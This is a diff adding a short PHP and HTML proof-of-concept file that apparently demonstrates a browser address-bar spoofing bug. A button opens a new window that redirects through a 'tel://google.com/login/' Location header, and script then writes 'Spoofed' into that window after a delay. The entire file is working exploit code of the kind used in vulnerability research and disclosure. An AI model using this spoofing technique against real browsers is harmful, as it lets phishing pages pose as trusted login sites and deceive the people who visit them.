@@ -1,0 +1,28 @@
+<?php
+if (isset($_GET['r']) && $_GET['r'] == '1') {
+    header("Location: tel://google.com/login/");
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <button style=font-size:40px onclick="poc();">Click Me</button>
+<script>
+
+var win='';
+function poc(){
+win=window.open(window.location.href+'?r=1');
+
+setTimeout(()=>{win.document.write('<font size=240>Spoofed');},777);
+
+}
+
+</script>
+</body>
+</html>
